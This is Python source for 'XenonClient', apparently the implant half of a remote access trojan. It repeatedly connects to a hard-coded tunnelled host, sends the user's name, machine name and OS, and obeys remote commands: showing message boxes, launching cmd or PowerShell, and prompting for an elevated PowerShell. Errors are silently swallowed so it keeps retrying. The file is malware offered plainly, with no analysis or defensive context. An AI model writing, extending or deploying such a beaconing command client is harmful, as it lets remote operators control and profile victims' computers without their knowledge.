import socket, subprocess, json, time, threading, tkinter as tk
from tkinter import messagebox
import platform, getpass, urllib.request

class XenonClient:
    def __init__(self, ip, port):
        self.server_ip = ip; self.port = port

    def run(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.server_ip, self.port))
                
                info = {
                    "id": f"{getpass.getuser()}@{platform.node()}",
                    "os": f"{platform.system()} {platform.release()}",
                    "country": "TR"
                }
                self.sock.send(json.dumps(info).encode("utf-8"))
                
                while True:
                    raw_data = self.sock.recv(16384).decode("utf-8")
                    if not raw_data: break
                    data = json.loads(raw_data)
                    cmd = data.get("cmd")
                    
                    if cmd == "msg":
                        threading.Thread(target=lambda: messagebox.showinfo("Xenon", data.get("val"))).start()
                    elif cmd == "cmd":
                        subprocess.Popen("start cmd", shell=True)
                    elif cmd == "ps":
                        subprocess.Popen("start powershell", shell=True)
                    elif cmd == "ps_admin":
                        subprocess.Popen("powershell Start-Process powershell -Verb runAs", shell=True)
                    elif cmd == "chat":
                        # Chat başlatma kodu buraya...
                        pass
            except: time.sleep(5)

if __name__ == "__main__":
    XenonClient("uwtd3ffva.localto.net", 8212).run()
